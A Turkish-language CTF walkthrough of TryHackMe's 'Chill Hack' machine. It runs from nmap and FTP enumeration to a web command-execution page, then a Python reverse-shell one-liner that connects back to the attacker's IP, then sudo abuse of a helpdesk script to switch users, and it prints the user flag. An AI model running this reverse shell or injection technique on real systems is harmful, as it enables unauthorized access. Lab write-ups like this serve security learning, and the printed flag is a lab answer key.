## Giriş

Hoşgeldiniz! Bu yazımda Tryhackme’de bulunan <a href="https://tryhackme.com/room/chillhack">Chill Hack</a> makinesinin çözümünü paylaşacağım.

Başlayalım.

---

Öncelikle nmap taraması başlatalım.


```
┌──(root㉿r3tr0)-[~]
└─# nmap -T5 -v -sV  10.10.28.212 
```

nmap çıktısı:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-11 17:30 EST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 17:30
Scanning 10.10.28.212 [4 ports]
Completed Ping Scan at 17:30, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:30
Completed Parallel DNS resolution of 1 host. at 17:30, 0.00s elapsed
Initiating SYN Stealth Scan at 17:30
Scanning 10.10.28.212 (10.10.28.212) [1000 ports]
Discovered open port 22/tcp on 10.10.28.212
Discovered open port 80/tcp on 10.10.28.212
Discovered open port 21/tcp on 10.10.28.212
Completed SYN Stealth Scan at 17:30, 1.41s elapsed (1000 total ports)
Initiating Service scan at 17:30
Scanning 3 services on 10.10.28.212 (10.10.28.212)
Completed Service scan at 17:31, 6.22s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.28.212.
Initiating NSE at 17:31
Completed NSE at 17:31, 0.43s elapsed
Initiating NSE at 17:31
Completed NSE at 17:31, 0.38s elapsed
Nmap scan report for 10.10.28.212 (10.10.28.212)
Host is up (0.096s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.040KB)
```                    

ftp servisine anonymous olarak girmeyi deneyelim.

```                   
┌──(root㉿r3tr0)-[~]
└─# ftp 10.10.28.212        
Connected to 10.10.28.212.
220 (vsFTPd 3.0.3)
Name (10.10.28.212:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||10060|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||57821|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |****************************************************************|    90       58.35 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.94 KiB/s)
ftp> exit
221 Goodbye.
```         

note.txt dosyası buluyorum ve indirip içeriğine bakıyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a1.png?raw=true)


Henüz bununla ne yapılacağından tam olarak emin değilim, o yüzden numaralandırmaya devam edelim. İki olası kullanıcı adımız var: Anurodh ve Apaar.

Web sitesini ziyaret edelim.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a2.png?raw=true)

Siteye gittiğimizde basit bir web sayfası buluyoruz.

Gobuster çalıştırıp gizli dizin arayalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a3.png?raw=true)

secret sayfasını buluyorum ve araştırmak için siteye gidiyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a4.png?raw=true)

Komut çalıştırabileceğimiz bir websitesi bırak kurcalayalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a5.png?raw=true)

[Revshell](https://www.revshells.com/) sitesine giderek reverse shell kodunu kopyalıyorum.

```
export RHOST="10.14.61.127";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a6.png?raw=true)

Makineye giriş yapmayı başardım.

Shellimizi stabil hale getirelim.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Apaar'ın ana dizinindeki local.txt bayrağına erişmeye çalışırken erişim reddedildi. Www-data kullanıcısının ayrıcalıklarını yükseltmemiz gerekecek gibi görünüyor.

```
sudo -l
```
```
ww-data@ubuntu:/home/apaar$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

İlginç, dosyayı cat ile açalım.

```
www-data@ubuntu:/home/apaar$ cat .helpline.sh
#!/bin/bash
echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo
read -p "Enter the person whom you want to talk with: " person
read -p "Hello user! I am $person,  Please enter your message: " msg
$msg 2>/dev/null
echo "Thank you for your precious time!"
```

Bu dosya ile apaar kullanıcısına geçebiliriz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a7.png?raw=true)

user bayrağını alalım.

```
apaar@ubuntu:~$ ls
ls
local.txt
apaar@ubuntu:~$ cat local.txt
cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

>{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

Geri yetki yükseltmek ve root bayrağını almak kaldı.
